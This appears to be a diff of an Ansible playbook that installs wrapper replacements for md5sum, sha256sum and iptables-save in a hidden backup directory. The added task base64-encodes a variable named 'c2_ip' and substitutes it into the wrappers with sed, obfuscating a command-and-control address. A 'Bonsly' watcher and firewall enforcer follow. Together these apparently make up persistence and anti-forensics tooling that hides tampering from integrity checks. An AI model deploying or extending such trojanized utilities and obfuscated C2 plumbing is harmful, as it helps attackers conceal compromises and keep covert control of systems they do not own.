@@ -212,7 +212,7 @@
         group: root
         mode: "0700"
 
-    - name: Copy wrapper sources to hidden backup dir (keep __ENC__ placeholder)
+    - name: Copy wrapper sources to hidden backup dir (with IP baked in)
       copy:
         src: "{{ wrapper_src }}/{{ item }}"
         dest: "{{ backup_dir }}/{{ item }}"
@@ -256,6 +256,16 @@
         - md5sum_wrapper.sh
         - sha256sum_wrapper.sh
         - iptables-save_wrapper.sh
+
+    - name: Base64-encode collector IP and replace __ENC__ in backup copies
+      shell: |
+        _E=$(printf "%s" "{{ c2_ip }}" | base64 -w0)
+        for f in {{ backup_dir }}/*_wrapper.sh; do
+          sed -i "s/__ENC__/${_E}/g" "$f"
+        done
+        true
+      args:
+        executable: /bin/bash
 
     # -------------------------------------------------------
     # 7. Deploy Bonsly (wrapper watcher + firewall enforcer)
